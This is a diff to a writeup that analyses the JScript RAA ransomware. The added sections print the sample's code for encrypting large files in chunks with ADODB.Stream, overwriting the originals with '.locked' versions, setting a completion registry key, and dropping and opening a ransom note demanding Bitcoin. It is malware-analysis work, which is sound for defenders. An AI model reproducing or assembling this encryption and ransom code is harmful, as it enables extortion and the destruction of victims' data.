@@ -681,7 +681,9 @@ function ukBnxEOtjm(EQs) {
 }
 ```
 
-But before each file passes through those four lines, a lot of other things are done. Let's go through them step by step.
+To this function goes every single file which RAA wants to encrypt.
+
+But before any file passes through those four lines, a lot of other things is happening. Let's go through them step by step.
 
 First, two variables are initialized with values returned from **rStinsVp()** function:
 
@@ -690,7 +692,7 @@ var HZtSmFNRdJM_data = rStinsVp(VKw);
 var qPCIyff = rStinsVp(VKw);
 ```
 
-This function takes one argument, **VKw**, which is one of two values returned from remote server (see 'Connect to the server
+**rStinsVp()** function takes one argument, **VKw**, which is one of two values returned from remote server (see 'Connect to the server
 ' part of this writeup with **get_HZtSmFNRdJM()** function description above).
 
 
@@ -961,6 +963,85 @@ function qqJ(IMhTname) {
     return 0;
 }
 ```
+
+This function, as mentioned earlier, is responsible for encryption process of files bigger than 4,76 MB and smaller than 476 MB.
+
+It works little different than previous one. First of all, it creates two Windows Script _ADODB.Stream_ objects and content of file to encrypt is loaded into **SlSPWu** with _LoadFromFile()_ method:
+
+```javascript
+var SlSPWu = WScript.CreateObject("ADODB.Stream");
+SlSPWu.CharSet = '437';
+SlSPWu.Open();
+SlSPWu.LoadFromFile(IMhTname);
+var FhDYKCTNZFu = WScript.CreateObject("ADODB.Stream");
+FhDYKCTNZFu.CharSet = '437';
+FhDYKCTNZFu.Open();
+```
+
+Next, file is being encrypted in chunks:
+
+```javascript
+var GinRqOjln = OQlYdejWlC(90000, 125000);
+var PRuJZyAvfeza = SlSPWu.Size;
+var VVe = SlSPWu.ReadText(GinRqOjln);
+var cBKyRXWGPWBs = ukBnxEOtjm(VVe);
+cBKyRXWGPWBs = String(cBKyRXWGPWBs);
+var rMkTeqZm = cBKyRXWGPWBs.length;
+SlSPWu.Position = PRuJZyAvfeza - GinRqOjln;
+var ECgBWYtoib = SlSPWu.ReadText(GinRqOjln);
+var AblANuF = ukBnxEOtjm(ECgBWYtoib);
+AblANuF = String(AblANuF);
+var QfYmGGcYOFB = AblANuF.length;
+var IJDZ = ",";
+SlSPWu.Position = PRuJZyAvfeza - GinRqOjln;
+SlSPWu.SetEOS;
+```
+
+Chunk size (**GinRqOjln**) is calculated from byte 0 to randomly selected byte between 90000 and 125000. Each chunk is encrypted result of encryption is assigned to a string by calling _String_ constructor directly on this result, eg. ```cBKyRXWGPWBs = String(cBKyRXWGPWBs);```
+
+Everything, together with some additional information, like length of last string, is then write to **SlSPWu** stream:
+
+```javascript
+SlSPWu.WriteText(cBKyRXWGPWBs);
+SlSPWu.WriteText(AblANuF);
+SlSPWu.WriteText(rMkTeqZm);
+SlSPWu.WriteText(IJDZ);
+SlSPWu.WriteText(QfYmGGcYOFB);
+SlSPWu.WriteText(IJDZ);
+var ids = "IDNUM=" + cVjZujcP + "KEY_LOGIC=" + HZtSmFNRdJM_data[0] + "IV_LOGIC=" + qPCIyff[0] + "LOGIC_ID=3";
+SlSPWu.WriteText(ids);
+SlSPWu.Position = GinRqOjln;
+```
+
+Finally, content of **SlSPWu** stream is copied into **FhDYKCTNZFu**, and the same operation as in **omaDplUyHou()** is performed: change file name to the one with _.locked_ extension and then override original file with encrypted version.
+
+
+### End of the process
+
+When all files are encrypted, there are couple of lines left to execute in RAA.
+
+First, Windows Registry is updated with entry that RAA finished its dirty job:
+
+```javascript
+var FYSAj = WScript.CreateObject("WScript.Shell");
+FYSAj.RegWrite("HKCU\\RAA\\Raa-fnl\\", "beenFinished", "REG_SZ");
+```
+
+Next, _.rtf_ file with information message is copied into Desktop and opened with Wordpad:
+
+```javascript
+var IvTV = "C:\\" + "!!!README!!!" + TBucypWw + ".rtf";
+var xfejSVYO = new ActiveXObject("Scripting.FileSystemObject");
+var Nnz = FYSAj.SpecialFolders("Desktop");
+Nnz = Nnz += "\\";
+xfejSVYO.CopyFile(IvTV, Nnz);
+var rdm_fl = "wordpad.exe" + " " + IvTV;
+FYSAj.Run(rdm_fl, 3);
+return 0;
+```
+
+This file contains information about where and how affected user can contact to get decryption key, after paying some amount of money, in Bitcoins.
+
 
 ## Summary
 
